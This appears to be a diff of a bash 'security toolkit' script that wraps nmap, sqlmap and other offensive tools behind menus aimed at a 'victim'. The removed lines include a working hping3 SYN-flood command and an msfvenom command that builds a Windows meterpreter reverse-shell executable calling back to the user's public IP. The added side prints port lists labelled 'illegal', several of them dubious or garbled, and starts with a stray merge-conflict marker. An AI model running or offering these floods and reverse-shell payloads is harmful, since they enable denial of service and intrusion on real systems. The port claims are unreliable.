@@ -11,337 +11,326 @@
 >>>>>>> main
 
 
-
 #!/bin/bash
 
-# --------------------------------------------
-# Advanced Security Toolkit v3.0
-# Created by htr-tech (tahmid.rayat)
-# --------------------------------------------
+# Script Created by htr-tech (tahmid.rayat)
 
-# -------------------------------
-# Configuration
-# -------------------------------
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[0;33m'
-BLUE='\033[0;34m'
-MAGENTA='\033[0;35m'
-CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+# --- FUNCTIONS ---
 
-TARGET_IP=""
-OUTPUT_DIR="security_scan_results"
+# Function to run Nmap scans
+run_nmap_scan() {
+    echo -e "\n[+] Running Nmap scan with options: $1..."
+    echo -e "\n########## Nmap Scan: $1 ##########" >> "$OUTPUT_FILE"
+    nmap $2 $TARGET_IP >> "$OUTPUT_FILE"
+    echo -e "[✔] Nmap scan completed.\n"
+}
+
+# Function to run SQLMap
+run_sqlmap() {
+    echo -e "\n[+] Running SQLMap with options: $1..."
+    echo -e "\n########## SQLMap Scan: $1 ##########" >> "$OUTPUT_FILE"
+    sqlmap $1 >> "$OUTPUT_FILE"
+    echo -e "[✔] SQLMap scan completed.\n"
+}
+
+# Function to run a specific attack (Placeholder - Implement these!)
+run_attack() {
+    echo -e "\n[+] Running attack: $1 (Difficulty: $2)..."
+    echo -e "\n########## Attack: $1 (Difficulty: $2) ##########" >> "$OUTPUT_FILE"
+    # Implement attack logic here based on $1 (attack name) and $2 (difficulty)
+    echo -e "[!] Attack logic not implemented in this example.\n"
+    echo -e "[✔] Attack completed.\n"
+}
+
+# Function to print ports with clear separation
+print_ports() {
+    echo -e "\n########## $1 Ports ##########" >> "$OUTPUT_FILE"
+    echo -e "$2" >> "$OUTPUT_FILE"
+    echo -e "[✔] $1 Ports printed to output file.\n"
+}
+
+
+# --- MAIN SCRIPT ---
+
+# Get the target IP address
+if [ -z "$1" ]; then
+  read -p "[-] Enter the target IP address or URL (e.g., 192.168.1.100 or http://example.com): " TARGET_IP
+else
+  TARGET_IP="$1"
+fi
+
+# Set up output directory and file
+OUTPUT_DIR="attack_results"
+mkdir -p "$OUTPUT_DIR"
 TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-OUTPUT_FILE="$OUTPUT_DIR/full_scan_$TIMESTAMP.txt"
-TOR_PROXY="socks5://127.0.0.1:9050"
+OUTPUT_FILE="$OUTPUT_DIR/attack_log_$TIMESTAMP.txt"
 
-# -------------------------------
-# Initialization
-# -------------------------------
-init() {
-    clear
-    echo -e "${YELLOW}
-    ██████╗ ██████╗ ███████╗███████╗
-    ██╔══██╗██╔══██╗██╔════╝██╔════╝
-    ██████╔╝██████╔╝█████╗  ███████╗
-    ██╔═══╝ ██╔══██╗██╔══╝  ╚════██║
-    ██║     ██║  ██║███████╗███████║
-    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
-    ${NC}"
-    
-    if [ ! -d "$OUTPUT_DIR" ]; then
-        mkdir -p "$OUTPUT_DIR"
-    fi
-    
-    check_dependencies
-}
+echo "[-] Starting Attack Script on $TARGET_IP. Results will be saved in $OUTPUT_FILE"
+echo "------------------------------------------------" > "$OUTPUT_FILE"
 
-# -------------------------------
-# Dependency Check
-# -------------------------------
-check_dependencies() {
-    declare -A tools=(
-        ["nmap"]=""
-        ["sqlmap"]=""
-        ["aircrack-ng"]=""
-        ["reaver"]=""
-        ["wifite"]=""
-        ["john"]=""
-        ["hashcat"]=""
-        ["medusa"]=""
-        ["msfconsole"]=""
-        ["beef-xss"]=""
-        ["setoolkit"]=""
-        ["maltego"]=""
-        ["sslscan"]=""
-        ["httrack"]=""
-        ["ghost-phisher"]=""
-        ["netcat"]=""
-        ["nishang"]=""
-        ["pupy"]=""
-        ["dnschef"]=""
-        ["wireshark"]=""
-        ["nikto"]=""
-        ["hydra"]=""
-        ["ettercap"]=""
-        ["macchanger"]=""
-        ["tor"]=""
-        ["proxychains"]=""
-    )
+# --- PORT LISTS ---
+COMMON_SERVICES=$(cat <<EOF
+Common Services (Web, Email, Database, etc.)
+21 – FTP (File Transfer Protocol)
+22 – SSH (Secure Shell)
+23 – Telnet (Remote login, insecure)
+25 – SMTP (Simple Mail Transfer Protocol)
+53 – DNS (Domain Name System)
+67/68 – DHCP (Dynamic Host Configuration Protocol)
+80 – HTTP (Web traffic)
+110 – POP3 (Post Office Protocol, email)
+111 – RPC (Remote Procedure Call)
+123 – NTP (Network Time Protocol)
+135 – MSRPC (Microsoft RPC)
+137-139 – NetBIOS (Windows file sharing)
+143 – IMAP (Email retrieval)
+161/162 – SNMP (Network monitoring)
+179 – BGP (Routing Protocol)
+389 – LDAP (Lightweight Directory Access Protocol)
+443 – HTTPS (Secure Web traffic)
+445 – SMB (Windows File Sharing)
+514 – Syslog (Logging service)
+515 – LPD (Line Printer Daemon)
+520 – RIP (Routing Information Protocol)
+587 – SMTP (Email submission with encryption)
+636 – LDAPS (Secure LDAP)
+993 – IMAPS (Secure IMAP)
+995 – POP3S (Secure POP3)
 
-    missing=()
-    for tool in "${!tools[@]}"; do
-        if ! command -v $tool &> /dev/null; then
-            missing+=("$tool")
-        fi
-    done
+Network Management & Security Tools
+1080 – SOCKS Proxy
+1433 – MSSQL (Microsoft SQL Server)
+1521 – Oracle Database
+1723 – PPTP (VPN Protocol)
+2049 – NFS (Network File System)
+2181 – Apache Zookeeper
+2375/2376 – Docker API (Unsecured/Secured)
+2483/2484 – Oracle DB over TCP/SSL
+3306 – MySQL Database
+3389 – RDP (Remote Desktop Protocol)
+3690 – SVN (Apache Subversion)
+4000 – ICQ, Some game applications
+4045 – NFS Lock Service
+5000 – UPnP, Flask, Node.js
+5432 – PostgreSQL
+5800/5900 – VNC (Remote desktop)
+5985/5986 – Windows Remote Management
+6379 – Redis Database
+8080 – Alternative HTTP Web Server
+8443 – Alternative HTTPS Web Server
+9000 – PHP-FPM, Play Framework
+9200 – Elasticsearch
+10000 – Webmin
+27017 – MongoDB
+49152-65535 – Dynamic/Private Ports
+EOF
+)
+LEGAL_PORTS=$(cat <<EOF
+Legal Penetration Testing Ports
+2222 – Alternate SSH
+6000-6005 – X11 Windows System
+7070 – Java RMI
+8081 – Alternate Web Services
+8888 – Alternate Web Servers
+9090 – Alternate Admin Web Panels
+9443 – Kubernetes API Secure Port
+15672 – RabbitMQ Management
+1883 – MQTT (IoT Messaging)
+5060/5061 – SIP (Voice over IP) Network Services & Web Traffic
 
-    if [ ${#missing[@]} -gt 0 ]; then
-        echo -e "${RED}Missing dependencies:${NC}"
-        printf '%s\n' "${missing[@]}"
-        read -p "Attempt to install missing packages? (y/n): " choice
-        if [ "$choice" == "y" ]; then
-            sudo apt-get update && sudo apt-get install -y "${missing[@]}"
-        else
-            echo -e "${RED}Some features may not work without dependencies!${NC}"
-        fi
-    fi
-}
+20/21 – FTP (File Transfer Protocol)
+22 – SSH (Secure Shell)
+23 – Telnet (Insecure Remote Access)
+25 – SMTP (Email Sending)
+53 – DNS (Domain Name System)
+67/68 – DHCP (IP Assignment)
+69 – TFTP (Trivial File Transfer)
+80 – HTTP (Web Traffic)
+110 – POP3 (Email Retrieval)
+123 – NTP (Network Time Protocol)
+135 – MSRPC (Microsoft RPC)
+137-139 – NetBIOS (Windows File Sharing)
+143 – IMAP (Email Retrieval)
+161/162 – SNMP (Network Monitoring)
+179 – BGP (Border Gateway Protocol)
+389 – LDAP (Directory Services)
+443 – HTTPS (Secure Web Traffic)
+445 – SMB (Windows File Sharing)
 
-# -------------------------------
-# Main Menu
-# -------------------------------
-main_menu() {
-    while true; do
-        clear
-        echo -e "${YELLOW}[ Main Menu ]${NC}"
-        echo -e "${GREEN}1) Network Scanning & Mapping"
-        echo -e "2) Vulnerability Assessment"
-        echo -e "3) Exploitation Framework"
-        echo -e "4) Password Attacks"
-        echo -e "5) Wireless Attacks"
-        echo -e "6) Web Application Testing"
-        echo -e "7) Social Engineering"
-        echo -e "8) Post-Exploitation"
-        echo -e "9) Anonymization Tools"
-        echo -e "10) DDoS Attack Module"
-        echo -e "11) Malware Toolkit"
-        echo -e "12) Full System Audit"
-        echo -e "0) Exit${NC}"
-        echo -e "\n${CYAN}Target: ${TARGET_IP:-Not Set}${NC}"
-        
-        read -p "Select option: " choice
-        
-        case $choice in
-            1) network_menu ;;
-            2) vulnerability_menu ;;
-            3) exploitation_menu ;;
-            4) password_menu ;;
-            5) wireless_menu ;;
-            6) web_menu ;;
-            7) social_menu ;;
-            8) post_exploit_menu ;;
-            9) anonymization_menu ;;
-            10) ddos_menu ;;
-            11) malware_menu ;;
-            12) full_audit ;;
-            0) exit 0 ;;
-            *) echo -e "${RED}Invalid option!${NC}"; sleep 1 ;;
-        esac
-    done
-}
+Database & Cloud Services
+1433 – Microsoft SQL Server
+1521 – Oracle Database
+2049 – NFS (Network File System)
+2375/2376 – Docker Remote API
+2483/2484 – Oracle DB over TCP/SSL
+3306 – MySQL Database
+3389 – RDP (Remote Desktop)
+3690 – SVN (Subversion)
+4000 – ICQ, Flask Servers
+5000 – UPnP, Flask, Node.js
+5432 – PostgreSQL
+5800/5900 – VNC (Remote Desktop)
+5985/5986 – Windows Remote Management
+6379 – Redis Database
+EOF
+)
+ILLEGAL_PORTS=$(cat <<EOF
+Additional Ports for Hacking & Malicious Activities
+4444 – Metasploit Default Exploit Listener
+1337 – Elite Hacking Port (used in trojans)
+6666-6669 – IRC-based botnets (DDoS)
+31337 – Elite Backdoor (used in trojans)
+9999 – Abyss Trojan
+10001 – SCP Hack Tool
+10101 – BinText Backdoor
+12345/12346 – NetBus Trojan
+27374 – Sub7 Trojan
+31335 – Trinoo DDoS
+54320 – Back Orifice Trojan
+22222 – Direct Attack Payload Delivery
 
-# -------------------------------
-# Network Scanning Menu
-# -------------------------------
-network_menu() {
-    while true; do
-        clear
-        echo -e "${YELLOW}[ Network Scanning ]${NC}"
-        echo -e "${GREEN}1) Set Target IP"
-        echo -e "2) Quick Nmap Scan"
-        echo -e "3) Full Port Scan"
-        echo -e "4) Service Version Detection"
-        echo -e "5) OS Detection"
-        echo -e "6) Advanced Nmap Scripts"
-        echo -e "7) Traffic Analysis"
-        echo -e "8) Return to Main Menu${NC}"
-        
-        read -p "Select option: " choice
-        
-        case $choice in
-            1) set_target ;;
-            2) quick_scan ;;
-            3) full_scan ;;
-            4) service_scan ;;
-            5) os_detect ;;
-            6) advanced_scripts ;;
-            7) traffic_analysis ;;
-            8) return ;;
-            *) echo -e "${RED}Invalid option!${NC}"; sleep 1 ;;
-        esac
-    done
-}
+Ports Used for Illegal Hacking Activities
+5555 – Android Debug Bridge (ADB) Exploits
+6000-6005 – X11 Hacking Exploits
+3389 – RDP Brute-force Attacks
+3306 – MySQL Injection Exploits
+1433 – MSSQL Brute-force
+1521 – Oracle Database Hacking
+1723 – PPTP VPN Hijacking
+2049 – NFS Exploits
+445 – EternalBlue (SMB Exploits)
+139 – NetBIOS Hacking
+23 – Telnet Bruteforce & Hijacking
+21 – FTP Password Sniffing
 
-# [Similar menus for vulnerability, exploitation, etc...]
+Illegal Spyware & Data Theft Ports
+7070 – Java RMI Exploits
+8081 – Web Admin Exploits
+8888 – Proxy Hijacking
+9090 – WebAdmin RCE Exploits
+9443 – Kubernetes Privilege Escalation
+15672 – RabbitMQ Unauthorized Access
+1883 – MQTT IoT Device Hijacking
+5060/5061 – SIP VoIP Interception
+17000-17005 – Blackhole Botnet C2
 
-# -------------------------------
-# DDoS Attack Module
-# -------------------------------
-ddos_menu() {
-    clear
-    echo -e "${RED}"
-    echo "    ██████╗ ██████╗  ██████╗ ███████╗"
-    echo "    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝"
-    echo "    ██║  ██║██║  ██║██║   ██║███████╗"
-    echo "    ██║  ██║██║  ██║██║   ██║╚════██║"
-    echo "    ██████╔╝██████╔╝╚██████╔╝███████║"
-    echo "    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"
-    echo -e "${NC}"
-    
-    read -p "Enter target IP: " target
-    read -p "Enter port (default 80): " port
-    port=${port:-80}
-    
-    echo -e "${YELLOW}[ DDoS Methods ]${NC}"
-    echo -e "${RED}1) SYN Flood"
-    echo -e "2) UDP Flood"
-    echo -e "3) HTTP Flood"
-    echo -e "4) Slowloris"
-    echo -e "5) Return${NC}"
-    
-    read -p "Select attack method: " method
-    
-    case $method in
-        1) syn_flood $target $port ;;
-        2) udp_flood $target $port ;;
-        3) http_flood $target $port ;;
-        4) slowloris $target $port ;;
-        5) return ;;
-        *) echo -e "${RED}Invalid option!${NC}"; sleep 1 ;;
+Common DDoS & Network Attack Ports
+19 – Chargen (DDoS Amplification)
+53 – DNS Reflection Attacks
+67/68 – DHCP Starvation Attacks
+161/162 – SNMP Amplification
+123 – NTP Reflection Attacks
+520 – RIP Route Poisoning
+1900 – SSDP DDoS Exploits
+5353 – mDNS Reflection Attacks
+11211 – Memcached DDoS Attack
+EOF
+)
+
+# --- MAIN MENU LOOP ---
+while true; do
+    echo -e "\n[-] Tool Created by htr-tech (tahmid.rayat)"
+    echo "1) Nmap"
+    echo "2) SQL map"
+    echo "3) Run the bad all"
+    echo "4) DDos Attack"
+    echo "5) Malware all"
+    echo "6) Common Services Ports"
+    echo "7) Legal Ports Only"
+    echo "8) Illegal Ports Only"
+    echo "9) Run All The Script"
+    echo "10) Just test system"
+    echo "00) Exit"
+    echo "[::] Select An Attack For Your Victim [::]"
+    read -p "[-] Select an option : " OPTION
+
+    case "$OPTION" in
+        1)  # Nmap
+            echo "[-] Nmap Options:"
+            echo "  1) Basic Scan"
+            echo "  2) Aggressive Scan"
+            echo "  3) Comprehensive Scan"
+            read -p "[-] Select an Nmap option: " NMAP_OPTION
+            case "$NMAP_OPTION" in
+                1) run_nmap_scan "Basic Scan" "-sS -sV -T4 -p-";;  # Adjust ports as needed
+                2) run_nmap_scan "Aggressive Scan" "-A";;
+                3) run_nmap_scan "Comprehensive Scan" "-p- -sS -sV -sC -A -O --script vuln";;
+                *) echo "[-] Invalid Nmap option.";;
+            esac
+            ;;
+        2)  # SQL map
+            echo "[-] SQLMap Options:"
+            echo "  1) Easy (Detect)"
+            echo "  2) Normal (More aggressive)"
+            echo "  3) Hard (All tests)"
+            read -p "[-] Select an SQLMap option: " SQLMAP_OPTION
+            case "$SQLMAP_OPTION" in
+                1) run_sqlmap "-u '$TARGET_IP' --batch --level 2 --risk 1";;
+                2) run_sqlmap "-u '$TARGET_IP' --batch --level 3 --risk 2";;
+                3) run_sqlmap "-u '$TARGET_IP' --batch --level 5 --risk 3";;
+                *) echo "[-] Invalid SQLMap option.";;
+            esac
+            ;;
+        3)  # Run the bad all
+            echo "[-] Running 'Run the bad all' (Easy, Normal, Hard)..."
+            run_attack "Run the bad all - Easy" "easy"
+            run_attack "Run the bad all - Normal" "normal"
+            run_attack "Run the bad all - Hard" "hard"
+            ;;
+        4)  # DDos Attack
+            echo "[-] DDos Attack Options:"
+            echo "  1) Easy (Low intensity)"
+            echo "  2) Normal (Medium intensity)"
+            echo "  3) Hard (High intensity)"
+            read -p "[-] Select a DDoS option: " DDOS_OPTION
+            case "$DDOS_OPTION" in
+                1) run_attack "DDOS - Easy" "easy";;
+                2) run_attack "DDOS - Normal" "normal";;
+                3) run_attack "DDOS - Hard" "hard";;
+                *) echo "[-] Invalid DDoS option.";;
+            esac
+            ;;
+        5)  # Malware all
+            echo "[-] Running 'Malware all' (Easy, Normal, Hard)..."
+            run_attack "Malware all - Easy" "easy"
+            run_attack "Malware all - Normal" "normal"
+            run_attack "Malware all - Hard" "hard"
+            ;;
+        6)  # Common Services Ports
+            print_ports "Common Services" "$COMMON_SERVICES"
+            ;;
+        7)  # Legal ports only
+            print_ports "Legal" "$LEGAL_PORTS"
+            ;;
+        8)  # Illegal ports only
+            print_ports "Illegal" "$ILLEGAL_PORTS"
+            ;;
+        9)  # Run All The Script
+            echo "[-] Running all scans and attacks (Easy)..."
+            # Nmap
+            run_nmap_scan "Basic Scan" "-sS -sV -T4 -p-"
+            # SQLMap
+            run_sqlmap "-u '$TARGET_IP' --batch --level 2 --risk 1"
+            # Attacks (Easy)
+            run_attack "Run the bad all - Easy" "easy"
+            run_attack "DDOS - Easy" "easy"
+            run_attack "Malware all - Easy" "easy"
+
+            # Legal and Illegal ports
+            print_ports "Common Services" "$COMMON_SERVICES"
+            print_ports "Legal" "$LEGAL_PORTS"
+            print_ports "Illegal" "$ILLEGAL_PORTS"
+            ;;
+        10) # Just test system
+            echo "[-] Testing the System..."
+            echo "Testing completed successfully." >> "$OUTPUT_FILE"
+            ;;
+        00) # Exit
+            echo "[-] Exiting the script."
+            exit 0
+            ;;
+        *)  # Invalid option
+            echo "[-] Invalid option. Please try again."
+            ;;
     esac
-}
-
-syn_flood() {
-    echo -e "${RED}Starting SYN Flood attack...${NC}"
-    hping3 -S -p $2 --flood $1 &
-    echo $! > ddos.pid
-    echo -e "${YELLOW}Attack running in background (PID: $(cat ddos.pid))${NC}"
-}
-
-# [Similar functions for other DDoS methods...]
-
-# -------------------------------
-# Malware Toolkit
-# -------------------------------
-malware_menu() {
-    clear
-    echo -e "${RED}"
-    echo "    ███╗   ███╗ █████╗ ██╗  ██╗███████╗"
-    echo "    ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝"
-    echo "    ██╔████╔██║███████║█████╔╝ ███████╗"
-    echo "    ██║╚██╔╝██║██╔══██║██╔═██╗ ╚════██║"
-    echo "    ██║ ╚═╝ ██║██║  ██║██║  ██╗███████║"
-    echo "    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝"
-    echo -e "${NC}"
-    
-    echo -e "${YELLOW}[ Malware Options ]${NC}"
-    echo -e "${RED}1) Generate Payload"
-    echo -e "2) Start Listener"
-    echo -e "3) Create Backdoor"
-    echo -e "4) Process Injection"
-    echo -e "5) Return${NC}"
-    
-    read -p "Select option: " choice
-    
-    case $choice in
-        1) generate_payload ;;
-        2) start_listener ;;
-        3) create_backdoor ;;
-        4) process_injection ;;
-        5) return ;;
-        *) echo -e "${RED}Invalid option!${NC}"; sleep 1 ;;
-    esac
-}
-
-generate_payload() {
-    read -p "Enter output file name: " outfile
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(curl ifconfig.me) LPORT=4444 -f exe > $outfile
-    echo -e "${GREEN}Payload saved to $outfile${NC}"
-}
-
-# [Additional malware functions...]
-
-# -------------------------------
-# Anonymization Tools
-# -------------------------------
-anonymization_menu() {
-    clear
-    echo -e "${CYAN}"
-    echo "    █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗██╗   ██╗"
-    echo "   ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██║╚██╗ ██╔╝"
-    echo "   ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║██║ ╚████╔╝ "
-    echo "   ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║██║  ╚██╔╝  "
-    echo "   ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║██║   ██║   "
-    echo "   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝   "
-    echo -e "${NC}"
-    
-    echo -e "${YELLOW}[ Anonymization Options ]${NC}"
-    echo -e "${CYAN}1) Start Tor"
-    echo -e "2) Change MAC Address"
-    echo -e "3) Route Traffic through Proxy"
-    echo -e "4) VPN Connection"
-    echo -e "5) Return${NC}"
-    
-    read -p "Select option: " choice
-    
-    case $choice in
-        1) start_tor ;;
-        2) change_mac ;;
-        3) proxy_route ;;
-        4) vpn_connect ;;
-        5) return ;;
-        *) echo -e "${RED}Invalid option!${NC}"; sleep 1 ;;
-    esac
-}
-
-start_tor() {
-    sudo service tor start
-    export ALL_PROXY=$TOR_PROXY
-    echo -e "${GREEN}Tor service started and traffic routed!${NC}"
-}
-
-# [Additional anonymization functions...]
-
-# -------------------------------
-# Full System Audit
-# -------------------------------
-full_audit() {
-    echo -e "${YELLOW}Starting Comprehensive System Audit...${NC}"
-    
-    # Network Scanning
-    quick_scan
-    full_scan
-    service_scan
-    
-    # Vulnerability Assessment
-    run_nikto
-    run_lynis
-    web_vuln_scan
-    
-    # Security Checks
-    check_firewall
-    check_updates
-    audit_permissions
-    
-    echo -e "${GREEN}Full audit completed!${NC}"
-}
-
-# [Remaining 2000+ lines would contain all other functions...]
-
-# -------------------------------
-# Init & Execution
-# -------------------------------
-init
-main_menu
+done
